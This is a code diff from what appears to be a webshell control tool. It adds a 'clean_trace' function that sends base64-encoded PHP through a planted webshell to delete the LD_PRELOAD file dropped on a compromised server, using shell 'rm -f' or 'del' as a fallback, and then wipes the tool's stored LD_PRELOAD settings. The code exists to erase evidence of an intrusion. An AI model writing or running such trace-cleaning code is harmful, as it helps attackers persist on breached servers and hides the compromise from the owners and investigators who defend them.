@@ -71,6 +71,27 @@ def base64_decode(data: str):
     return b64decode(data.encode()).decode()
 
 
+def clean_trace():
+    def get_clean_ld_preload_php(filename: str):
+        system_clean_command = f"del /F /Q {filename}" if is_windows() else f"rm -f {filename}" + " && echo success"
+        return """$f=base64_decode("%s");
+    if (!unlink($f)){
+        %s
+    }else{echo "success";}
+    """ % (base64_encode(filename), get_system_code(system_clean_command))
+    ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
+    if (ld_preload_filename):
+        print(color.yellow("\nClean LD_PRELOAD traces...\n"))
+        res = send(get_clean_ld_preload_php(ld_preload_filename))
+        if (res):
+            text = res.r_text.strip()
+            if ("success" in text):
+                print(color.green("Clean success\n"))
+            else:
+                print(color.red("Clean failed\n"))
+    gset("webshell.ld_preload_path", None, True, "webshell")
+    gset("webshell.ld_preload_func", None, True, "webshell")
+
 def send(data: str, raw: bool = False, **extra_params):
     offset = 8
 
